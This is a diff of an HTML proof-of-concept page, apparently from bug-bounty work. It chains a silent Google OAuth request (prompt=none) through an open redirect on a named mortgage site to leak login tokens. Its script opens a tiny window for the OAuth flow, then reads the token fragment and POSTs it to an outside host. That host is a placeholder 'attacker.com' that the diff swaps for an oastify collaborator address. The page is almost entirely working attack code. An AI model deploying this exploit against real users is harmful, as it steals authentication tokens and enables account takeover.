@@ -9,14 +9,14 @@
     <input type="button" value="exploit" onclick="exploit()">
     <script>
         function exploit() {
-            window.open("https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=https://www.upstartmortgage.com/external-redirect/?target=https://gvfwm5v7dgk7kfgmdyu5f7mstjzan0bp.oastify.com/aa?aa=aa&response_type=id_token&code_challenge=fouwSGR0zgiQo9exhKLR4_ov7beA3_Dprw97UWYlE80&code_challenge_method=S256&scope=openid email profile&kc_idp_hint=google&scope=https://www.googleapis.com/auth/userinfo.profile%20https://www.googleapis.com/auth/userinfo.email&state=&response_type=id_token,code&prompt=none", "", "width=10, height=10");
+            window.open("https://accounts.google.com/o/oauth2/auth?client_id=&redirect_uri=https://www.upstartmortgage.com/external-redirect/?target=https://8gpo7xgzy85z571eyqfx0z7kebk28uwj.oastify.com//aa?aa=aa&response_type=id_token&code_challenge=fouwSGR0zgiQo9exhKLR4_ov7beA3_Dprw97UWYlE80&code_challenge_method=S256&scope=openid email profile&kc_idp_hint=google&scope=https://www.googleapis.com/auth/userinfo.profile%20https://www.googleapis.com/auth/userinfo.email&state=&response_type=id_token,code&prompt=none", "", "width=10, height=10");
         }
 
         window.addEventListener('load', () => {
             const fragment = window.location.hash;
             if (fragment) {
                 const encodedFragment = encodeURIComponent(fragment);
-                fetch('https://attacker.com/save_tokens', {
+                fetch('https://8gpo7xgzy85z571eyqfx0z7kebk28uwj.oastify.com//save_tokens', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
